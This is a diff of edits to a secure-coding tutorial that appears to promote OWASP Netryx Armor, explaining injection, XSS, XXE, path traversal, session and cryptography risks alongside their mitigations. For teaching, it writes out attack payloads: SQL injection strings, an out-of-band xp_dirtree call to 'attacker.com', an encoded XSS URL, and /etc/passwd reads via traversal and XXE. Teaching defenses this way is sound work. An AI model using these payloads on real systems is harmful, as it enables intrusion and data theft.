@@ -10,20 +10,19 @@ This is the first and most fundamental principle that you need to wrap your head
 
 We divide validation into 2 types: syntax validation and semantic validation.
 **Syntax** validation implies that the data matches the format that we expect. For example, validating that the value entered is a number, e-mail address corresponds to a standard format, or the date is in the correct format (e.g. `YYYY-MM-DD`).
-**Semantic** validation, on the other hand, checks that the data is semantically correct. This can include checking that the date of birth is not a later than current one, that the age is within a reasonable range (e.g. 0 to 150 years old), or that the transaction amount does not exceed the balance available to the account, etc.
+**Semantic** validation, on the other hand, checks that the data is semantically correct. This can include checking that the date of birth is not a later than current one, that the age is within a reasonable range (e.g. 0 to 150 years old), or in another field, that the transaction amount does not exceed the balance available to the account.
 
-I'm sure most of you have heard about attack methods such as SQL, NoSQL, XSS, CMD, LDAP, and similar injections. But despite the fact of everyone knowing about them, the **Injection** vulnerability type is still at the leading positions in most applications, according to the **OWASP TOP 10**. So what exactly wrong then?
+I'm sure most of you have heard about attack methods such as SQL, NoSQL, XSS, CMD, LDAP, and similar injections. Despite the fact of everyone knowing about them, the **Injection** vulnerability type is still at the leading positions in most applications, according to the **OWASP Top 10**. Why is this?
 
-The problem is that developers often underestimate the complexities of security and rely on out-of-date security practices. High paces of development, business side pressures, and limited resources cause teams to focus on functionality and deadline over security. Many organizations also rely on WAF to create the illusion of total security against attacks, when in reality WAF is **addition** to other security practices. So let's say that, if Morpheus offered them a pill, they would choose the red one.
+The problem is that developers often underestimate the complexities of security, do not consult with security as they design software, or at best rely on out-of-date security practices. Fast pace of development, business side pressures, and limited resources cause teams to focus on functionality and deadline over security. Many organizations also rely on WAF to create the illusion of total security against attacks, when in reality WAF is **addition** to other security practices. So let's say that, if Morpheus offered them a pill, they would choose the red one.
 
-So let's refresh our memory, and look at the top application vulnerabilities caused by missing or incorrect data validation, and determine the most effective methods to mitigate them:
+Let's refresh our memory, and look at the top application vulnerabilities caused by missing or incorrect input validation, and determine the most effective methods to mitigate them:
 
 ### SQL Injection
 
-SQL Injection is the most popular type of injection attack that both rookies and security experts can think of. The attack is successful if data is “injected” via user input in a way that modifies the final SQL syntax that is executed in the database.
-I don't want to talk too much about stuff you probably already know, but let's run through some examples:
+SQL Injection is a type of injection attack that both rookies and security experts rank as the most likely. The attack is successful if SQL syntax data is “injected” via user input in a way that is read, modified, and executed in the database.
 
-Basic example of a very bad code:
+Basic examples of SQL injection in action:
 
 ```java
 String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
@@ -35,9 +34,9 @@ If the attacker sends `admin' --` in the input, then the final query will be:
 SELECT * FROM users WHERE username = 'admin' --' AND password = ''
 ```
 
-`--` commenting out a password check, thus depending on the context, it may give away access to the system. Obviously, in case of real attacks, we should expect more intricate payloads. For example, to bypass basic filters, the following are often used **Hexadecimal SQL Injection**:
+`--` commenting out a password check, thus depending on the context, may give away access to the system. Obviously, in case of real attacks, we should expect more intricate payloads. 
 
-Another example of a very bad code:
+For example, to bypass basic filters, the following are often used **Hexadecimal SQL Injection**:
 
 ```java
 String query = "SELECT * FROM users WHERE user_id = " + userId;
@@ -49,17 +48,17 @@ Let's convert `1 OR 1=1 --` into hexadecimal format and get `0x31204F5220313D31`
 SELECT * FROM users WHERE user_id = 0x31204F5220313D31
 ```
 
-which os equivalent to:
+which is equivalent to:
 
 ```sql
 SELECT * FROM users WHERE user_id = 1 OR 1=1 --
 ```
 
-I think it's obvious that this will return all users.
+As should be evident by now, this will return all users.
 
-#### How does an attacker identify the presence of SQL injections?
+#### How does a threat actor determine if an attack surface is vulnerable to SQL injection?
 
-Typically, **blind SQL injections** are used to identify this vulnerability. 2 most popular types are: **Time based SQL Injection** and **Out-of-Bound SQL Injection**. They are often used to identify vulnerable targets among the mined database of sites operating on the same basis (e.g. in WooCommerce).
+Typically, **blind SQL injections** are used to identify this vulnerability. The two most popular types are: **Time based SQL Injection** and **Out-of-Bound SQL Injection**. They are often used to identify vulnerable targets among the mined database of sites operating on the same basis (e.g. in WooCommerce).
 
 **Time based SQL Injection**
 The name speaks for itself. Let's take a look at the following example input:
@@ -71,11 +70,11 @@ The name speaks for itself. Let's take a look at the following example input:
 The whole point of the attack is to monitor the server response time. If there are delays in the response (in our case around 10 seconds), it means that the application is vulnerable to SQL Injection and the attack can be launched.
 
 **Out-of-Bound SQL Injection**
-This is a rather heavy type of SQL injection and its success depends heavily on the configuration of the target server. As an example, let's imagine that our target is using Microsoft SQL Server.
+This is a more tedious SQL injection attack that relies on asyncronous database entries and its success depends heavily on the configuration of the target server. As an example, let's imagine that our target is using Microsoft SQL Server.
 
-Let's imagine our bad fella runs their server on `attacker.com`. Their goal is to intercept all incoming DNS requests that are sent to their server, which is the **server vulnerability identifier**.
+The attacker runs their server on `attacker.com` with the goal of intercepting all incoming DNS requests to the target and routing them to the attacker's server, which is the **server vulnerability identifier**.
 
-After that, he sends the following payload:
+After that, they send the following payload:
 
 ```sql
 '; EXEC master..xp_dirtree '//attacker.com/sample'--.
@@ -87,9 +86,9 @@ If the database is misconfigured, `xp_dirtree` initiates a DNS lookup for the do
 
 The only appropriate solution for mitigating this type of vulnerability is to validate the input and then use `Prepared Statements`.
 
-Validation alone **will not** save you from SQL injections, it is hard to make a universal rule, we need to guarantee **isolation** of user input from query. Validation here acts as an additional yet **mandatory** layer of security to make sure that the data is syntactically and semantically correct.
+Validation alone **will not** save you from SQL injections. It is hard to make a universal rule, so we need to guarantee **isolation** of user input from query. Validation here acts as an additional yet **mandatory** layer of security to make sure that the data is syntactically and semantically correct.
 
-Here's an example of a proper code, with validation and using Prepared Statement. We will use [Netryx Armor](https://github.com/OWASP/www-project-netryx/tree/main) as the validation tool:
+Here's an example of a proper code, with validation and using Prepared Statement. We will use [OWASP Netryx Armor](https://github.com/OWASP/www-project-netryx/tree/main) as the validation tool:
 
 ```java
 armor.validator().input().validate("username", userInput)
@@ -105,7 +104,7 @@ armor.validator().input().validate("username", userInput)
         });
 ```
 
-If our goal is to passively block such data then machine learning models do a good job at this. Very good one at detecting injection attempts is **Naive Bayes**.
+If our goal is to passively block such data, machine learning models like **Naive Bayes** do a good job detecting injection attempts.
 
 ### NoSQL Injection
 
@@ -178,7 +177,7 @@ Or worse, they can delete a base by subming:
 
 Also an extremely popular injection attack method, which unlike SQL Injection, targets the **user** rather than the server. The ultimate goal of this attack is to execute JS code in the user's browser.
 
-There are 4 main varieties of this attack:
+There are four main varieties of this attack:
 
 #### Stored XSS
 
@@ -261,7 +260,7 @@ As you can see, in the case of such HTML page, the query parameter is processed 
 
 #### Polymorphic XSS
 
-Similar to polymorphic viruses, each time a malicious code is attempted, its code changes. To avoid pattern-based detection, the attacker often uses **multiple encoding**, and to hide the code, creates it on the fly.
+Similar to polymorphic viruses, each time malicious code is executed, its code changes. To avoid pattern-based detection, the attacker often uses **multiple encoding**, and to hide the code, creates it on the fly.
 
 For example, let's take our “innocent” script:
 
@@ -297,7 +296,7 @@ We can present it in a more complex way as well. Not so heavy obfuscation, so to
 </script>
 ```
 
-Now let's twice encode it and pass the parameters:
+Now let's encode it two times and pass the parameters:
 `http://example.com/?param=%253Cscript%253Elet%2520a%2520%253D%2520String.fromCharCode%253B%250Alet%2520script%2520%253D%2520a%252860%2529%2520%252B%2520a%2528115%2529%2520%252B%2520a%252899%2529%2520%252B%2520a%2528114%2529%2520%252B%2520a%2528105%2529%2520%252B%2520a%2528112%2529%2520%252B%2520a%2528116%2529%2520%252B%2520a%252862%2529%253B%250Alet%2520code%2520%253D%2520a%252897%2529%2520%252B%2520a%2528108%2529%2520%252B%2520a%2528101%2529%2520%252B%2520a%2528114%2529%2520%252B%2520a%2528116%2529%2520%252B%2520a%252840%2529%2520%252B%2520a%252839%2529%2520%252B%2520a%252888%2529%2520%252B%2520a%252883%2529%2520%252B%2520a%252883%2529%2520%252B%2520a%252839%2529%2520%252B%2520a%252841%2529%253B%250Alet%2520end%2520%253D%2520a%252860%2529%2520%252B%2520a%252847%2529%2520%252B%2520a%2528115%2529%2520%252B%2520a%252899%2529%2520%252B%2520a%2528114%2529%2520%252B%2520a%2528105%2529%2520%252B%2520a%2528112%2529%2520%252B%2520a%2528116%2529%2520%252B%2520a%252862%2529%253B%250Adocument.write%2528script%2520%252B%2520code%2520%252B%2520end%2529%253B%250A%253C%252Fscript%253E
 `
 
@@ -310,10 +309,10 @@ XSS occurs as a result of data either being displayed at the client side without
 So we need to do the following:
 
 1. Validate the data when it comes into the server
-2. Sanitize them at the moment of issuing to the client
-3. configure a **Content-Security** policy to prevent malicious scripts from being executed by limiting script sources with the use of directives.
+2. Sanitize the data at the moment of issuing to the client
+3. Configure a **Content-Security** policy to prevent malicious scripts from being executed by limiting script sources with the use of directives
 
-All of this is handled by [Netryx Armor](https://github.com/OWASP/www-project-netryx/tree/main).
+All of this is handled by [OWASP Netryx Armor](https://github.com/OWASP/www-project-netryx/tree/main).
 
 Validation:
 
@@ -338,7 +337,7 @@ var sanitizedJsData = armor.encoder().js(JavaScriptEncoderConfig.withMode(JavaSc
 var sanitizedHtmlData = armor.encoder().html().encode(outputHtmlData);
 ```
 
-Also right out of the box, Netryx Armor configures Netty-based web server including `Content-Security` policies. For secure configuration of policies, it is highly recommended to refer to the [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
+OWASP Netryx Armor configures a Netty-based web server including `Content-Security` policies right out of the box. For secure configuration of policies, it is highly recommended to refer to the [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
 
 ### XXE Injection
 
@@ -358,15 +357,15 @@ As a result, the attacker has sent us XML of the following kind:
 </order>
 ```
 
-If the XML parser is misconfigured, the specified contents of the `/etc/passwd` file will be written to the `<items>` block. Here we have caused the injection.
+If the XML parser is misconfigured, the specified contents of the `/etc/passwd` file will be written to the `<items>` block as the injection.
 
 #### Mitigation
 
-Here it is important to configure our XML parser correctly (a technique common to all programming languages):
+It is important to configure our XML parser correctly and is a technique common to all programming languages:
 
-1. disable the use and loading of external DTDs (Document Type Definition)
-2. disable processing of external generic entities
-3. disable processing of external parametric entities
+1. Disable the use and loading of external DTDs (Document Type Definition)
+2. Disable processing of external generic entities
+3. Disable processing of external parametric entities
 
 ```java
 DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
@@ -406,13 +405,13 @@ public class FileDownloadController {
 And the user performed the following query:
 `GET http://your-server.com/download?filename=../../../../etc/passwd`
 
-According to the code, the final path will be `/var/www/files/../../../../etc/passwd`, which is equivalent to `/etc/passwd`. Next, if the server has permission to this directory, will give us this file.
+According to the code, the final path will be `/var/www/files/../../../../etc/passwd`, which is equivalent to `/etc/passwd`. This now means if the server has permissions to traverse to this directory, will output **the entire etc/passwd file.**
 
 #### Mitigation
 
 Mitigation, as I'm sure you've already guessed, is quite simple. All you need to do is **normalize** the final path and check if you are within the correct directory.
 
-[Netryx Armor](https://github.com/OWASP/www-project-netryx) allows you to customize the desired directory and validate the resulting directory:
+[OWASP Netryx Armor](https://github.com/OWASP/www-project-netryx) allows you to customize the desired directory and validate the resulting directory:
 
 ```java
 armor.validator().path().validate(finalPath)
@@ -420,7 +419,7 @@ armor.validator().path().validate(finalPath)
 
 ### Parameter Tampering
 
-Let's imagine we are running our own e-commerce site. We have a product worth $100, and a form to create a payment:
+Let's imagine we are running our own e-commerce site. A user places an order for $100 on their personal credit card. To the server, a typical transaction would look like this: 
 
 ```html
 <form action="https://sample.com/checkout" method="POST">
@@ -444,7 +443,7 @@ Let's imagine we are running our own e-commerce site. We have a product worth $1
 </form>
 ```
 
-How do e-merchants usually work? A user pays for an item, and they send payment information to our webhook. Generally, a typical notification looks like the following:
+How does e-commerce work once that message is submitted? A user submits an order with a webhook enabled form. This form communicates order details, user data and payment data (see above) back to the merchant's server. The merchant's server then sends a message back to the user with a message like "Thanks for submitting your order!" but behind the scenes, the status message typically looks like the following:
 
 ```json
 {
@@ -458,13 +457,13 @@ How do e-merchants usually work? A user pays for an item, and they send payment 
 }
 ```
 
-Now imagine that the user changed the amount from 100.00$ to 1.0$ (via developer tools for example). After payment, the server will still receive a notification with the status `success`, but the invoice amount will be different.
+What if the $100 order could turn into one that was only $1.00? This attack could be accomplished via changing the order cost with developer tools on an insecure form where **input validation** fails yet still submits the order. In this described attack scenario, the server will still receive a notification with the status `success`, but the purchase amount will be different.
 
-If the server does not check the **integrity** of data that can be changed by the user, it will lead to a `Parameter Tampering` attack. A `signature` is provided for verification on the service side. This can apply not only to fields that the user sabmits via forms, but also to cookie values, headers, etc.
+If the server does not check the **integrity** of data that can be changed by the user, it will lead to a `Parameter Tampering` attack. A `signature` is provided for verification on the service side. This can apply not only to fields that the user submits via forms, but also to cookie values, headers, etc.
 
 #### Mitigation
 
-Data that depends on user input and whose authenticity cannot be guaranteed, e.g. due to dependency on external services beyond our control, requires protection using HMAC or digital signatures.
+Data that depends on user input and whose authenticity cannot be guaranteed, often due to dependency on external services beyond our control, requires protection using HMAC or digital signatures.
 
 Imagine if you issued JWT tokens without signatures. Any user could decode the token, replace the parameters in it with their own and send them to the server.
 
@@ -483,19 +482,19 @@ We have 2 nested greedy quantifiers here, which forces the RegEx engine to split
 
 #### Example of injection
 
-Let's imagine that we give users the ability to protect their social media groups from spam comments, and we have given them the ability to add their own regular expressions to filter messages.
+Let's imagine that we give users the ability to protect their social media groups from spam comments by giving them the ability to add their own regular expressions to filter messages.
 
-If an attacker adds such an “evil” regular expression, and writes a post with a lot of backtracking, it will cause the processing flow to stall.
+If an attacker adds a regular but malicious expression, and writes a post with a lot of backtracking, it will cause the processing flow to stall.
 
 #### Mitigation
 
 The easiest and most effective way to defend against this attack is to limit the **time** of execution of the regular expression. This is done simply by running the validation process in a separate thread (or virtual thread) and specifying the operation timeout.
 
-The [Netryx Armor](https://github.com/OWASP/www-project-netryx) validator is resistant to this type of attack.
+The [OWASP Netryx Armor](https://github.com/OWASP/www-project-netryx) validator is resistant to this type of attack.
 
 ## Access Control
 
-Access control primarily involves **authenticating** the user (simply put, identifying **who** has the access) and **authorizing** them (whether they have the right to access us). **Broken Access Control** is the top 1 vulnerability that is found in applications in one way or another.
+Access control primarily involves **authenticating** the user (simply put, identifying **who** has the access) and **authorizing** them (whether they have the right to access us). **Broken Access Control** is the top #1 vulnerability that is found in applications in one way or another.
 
 Before we look at the types of access controls, let's first establish one important rule: **All endpoints must be protected out of the box, and public endpoints must be explicitly specified, not the other way around**.
 
@@ -575,12 +574,12 @@ Simply put, let's imagine we have a blog with 4 roles: USER, AUTHOR, EDITOR and 
 
 In our blog management system, the **USER** role allows you to view published articles and interact with comments. **AUTHOR** inherits the `USER` rights and can additionally create and edit your articles by submitting them for review. **EDITOR** inherits the rights of `AUTHOR` and can publish, unpublish and edit only his/her articles, as well as moderate comments and assign tasks to authors. The **ADMIN** has full access to all aspects of the system, including user management, site customization, and content removal.
 
-Often (including in our example) a **wildcard** is allowed in the permissions to mean **ALL**. For example, let's imagine we have the permissions:
+Often (including in our example) a **wildcard** is allowed in the permissions to mean **ALL**. For example, we have the permissions:
 
 - `article.delete.own` - Gives the right to delete your own articles.
 - `article.delete.userid` - The right to delete a user with ID `userid`.
 
-And now we want to give `EDITOR` the right to delete all articles. In this case, we write to him:
+And now we want to give `EDITOR` the right to delete all articles. In this case, we write:
 
 - `article.delete.*` - Here `*` is a wildcard.
 
@@ -591,7 +590,7 @@ In order to take away a right, the `-` sign is usually added before the right. F
 
 ## Session Management
 
-Once we authenticate a user, we often create a session for them, and further store their session ID in cookies. The important thing here is to make sure we have considered all the risks during the authentication process and afterwards, so let's look at the main threats we need to consider:
+Once we authenticate a user, we create a session for them, and further store their session ID in cookies. The important thing here is to make sure we have considered all the risks during the authentication process and afterwards, so let's look at the main threats we need to consider:
 
 ### Session Fixation
 
@@ -599,7 +598,7 @@ The goal of this attack is simple and straightforward - the attacker must make a
 
 Let's consider a simple example:
 Depending on the web server architecture, it is often allowed to pass the session ID not via Cookies, but via Query parameters (this is especially possible if the user blocks cookies).
-As a result, when attempting to authorize, the attacker is given the session ID (e.g. `/login?sid=ABCDEFGH....`. Using phishing or any other methods, he can force the user to click on the link where his session ID is specified and authorize, after which the attacker is authorized along with the user.
+As a result, when attempting to authorize, the attacker is given the session ID (e.g. `/login?sid=ABCDEFGH....`. Using phishing or any other methods, they can force the user to click on the link where their session ID is specified and authorize, after which the attacker is authorized along with the user.
 
 #### Mitigation
 
@@ -658,7 +657,7 @@ Using JWT tokens instead of cookie sessions, and sending them in **headers** is 
 ## Secure Error Handling
 
 Our application, like any other information system goes from one state to another, and it is possible that eventually we will have to switch to the **error** state.
-We've already discussed this in a previous article, but let's do it again. After switching to the error state, it can be called safe if:
+We've already discussed this in a previous article, but let's do it again. Once an application fails and is in error state, it is critical for it to **fail safe**. An error can be considered to be failing safe if:
 
 1. No technical details of the system were issued as a result of the error
 2. The integrity and confidentiality of data has not been compromised
@@ -667,7 +666,7 @@ We've already discussed this in a previous article, but let's do it again. After
 
 In the context of secure programming, we especially need to pay attention to how we handle errors in our application. In many web frameworks like Spring Boot error handling is centralized, allowing them to be handled very efficiently.
 
-By default, in case an error we don't know is called (trivially, `IllegalStateException`, it can stand for anything), most frameworks will handle it in a response with the status code `502 Internal Server Error`, and **put the stacktrace right in the response**. This is a direct path to **Information Disclosure** - it will trivially give away a lot of information not just about the application's programming language, but about its internal structure. It exists only to speed up the development process so that you don't have to connect to the server an extra time to see the error, but when you go into **production**, this behavior **must** be disabled.
+By default, in case an error we don't know is called (trivially, `IllegalStateException`, it can stand for anything), most frameworks will handle it in a response with the status code `502 Internal Server Error`, and **put the stacktrace right in the response**. This is a direct path to **Information Disclosure** - it will give away a lot of information not just about the application's programming language, but about its internal structure. It exists only to speed up the development process so that you don't have to connect to the server an extra time to see the error, but when you go into **production**, this behavior **must** be disabled.
 
 **Information Disclosure** is actually a very dangerous error that can lead to catastrophic consequences. Don't forget, if your application becomes a target for attackers, the very first and almost the most basic step in exploiting vulnerabilities is **gathering information about the system**. Because knowing how your system is organized makes it much easier to find vulnerabilities in it.
 
@@ -767,7 +766,7 @@ Now let's summarize what we should have understood from here:
 
 ## Secure Cryptography
 
-When we work with sensitive data, we often resort to cryptography. For example:
+When we work with sensitive data, we rely on cryptography. For example:
 **hash** data that we don't need to know the original form of (e.g. passwords)
 **encrypt** data that we need to revert to its original form (e.g. data transfers)
 **sign** data that we need to ensure the integrity of (e.g. JWT tokens)
@@ -781,7 +780,7 @@ When it comes to hashing algorithms, we divide them into **fast** and **slow**. 
 - **SHA-256**
 - **SHA-1**
 - **SHA-3**
-- **MD5** - _It has vulnerabilities and is predictable, so don't use it in cryptographic operations_.
+- **MD5** - _Deprecated for cryptographic operations and is only valid as a noncryptographic checksum_.
 
 Slow algorithms are most often used to hash **confidential** data for later storage, because they are designed to require more processing power (e.g. memory consumption, CPU) to be resistant to types of attacks like **brute force**:
 
@@ -791,15 +790,15 @@ Slow algorithms are most often used to hash **confidential** data for later stor
 
 - **Argon2id** - Winner of the Password Hashing Competition (PHC) in 2015 and the most flexible among the described algorithms, which allows to customize the hashing complexity for different security requirements.
 
-Very often, in addition to **Brute Force** attacks, attackers use **Rainbow Hash Tables** to retrieve the original data (àla passwords) from their hash. These tables contain pre-computed hashes for a wide range of passwords, and while slow hashes make it difficult for the attacker (due to resource consumption), the most effective method of dealing with them is to use **salt** and **pepper**.
+Very often, in addition to **Brute Force** attacks, attackers use **Rainbow Hash Tables** to retrieve the original data (i.e. passwords) from their hash. These tables contain pre-computed hashes for a wide range of passwords, and while slow hashes make it difficult for the attacker (due to resource consumption), the most effective method of dealing with them is to use **Salt** and **Pepper**.
 
 **Salt** is a randomized set of bytes/symbols, most often at least 16-32 bytes long, that is added to the beginning or end of our data before hashing. It is stored in **open** form and is **unique** to each data that we hash.
 
-The **Pepper** is exactly the same random set of bytes, which unlike salt is **secret** and **NOT** unique for each chunk of data (i.e. 1 pepper for all passwords). It acts as an additional layer of defense and should be kept separate from our data. For example, if an attacker gains access to the password database, not knowing the pepper will make it nearly impossible to retrieve the original passwords.
+The **Pepper** is exactly the same random set of bytes, which unlike Salt is **secret** and **NOT** unique for each chunk of data (i.e. 1 pepper for all passwords). It acts as an additional layer of defense and should be kept separate from our data. For example, if an attacker gains access to the password database, not knowing the pepper will make it nearly impossible to retrieve the original passwords.
 
 ### Secure encryption
 
-Encryption comes in two types - **symmetric** and **asymmetric**. While symmetric encryption uses a single key to encrypt and decrypt data, asymmetric encryption has 2 keys: **public** for data encryption and **private** for decryption. Here it is important to use only up-to-date encryption algorithms that are invulnerable to brute force attacks, resistant to ciphertext analysis and simply effective in our realities.
+Encryption comes in two types - **symmetric** and **asymmetric**. While symmetric encryption uses a single key to encrypt and decrypt data, asymmetric encryption has 2 keys: **public** for data encryption and **private** for decryption. It is important to use only up-to-date encryption algorithms that are invulnerable to brute force attacks, resistant to ciphertext analysis and simply effective in our realities.
 
 The most secure symmetric algorithms currently available include:
 
@@ -1005,7 +1004,7 @@ public static void destroy(byte[] bytes) {
 
 There is also one important thing to consider. All this data is stored in RAM (**RAM**), right? When memory is not enough, data that is rarely used can **swap**'d to disk. Here it is important, in case sensitive data is stored in memory for a long time (let's say we cached it), it should **never be swapped to disk**. This can lead to a big internal threat if an attacker gets into the server, because disk is much easier to analyze than memory, and even if the data has already been deleted from it, if that memory segment has not been overwritten, it can be recovered.
 
-On UNIX systems, it is realized through memory allocation and `mlock` settings on them, and from Java, to allocate non-swappable memory, followed by its obfuscation can [Netryx Memory](https://github.com/OWASP/www-project-netryx) be used:
+On UNIX systems, it is realized through memory allocation and `mlock` settings on them, and from Java, to allocate non-swappable memory, followed by its obfuscation can [OWASP Netryx Memory](https://github.com/OWASP/www-project-netryx) be used:
 
 ```java
 byte[] data = "sensitive data".getBytes();
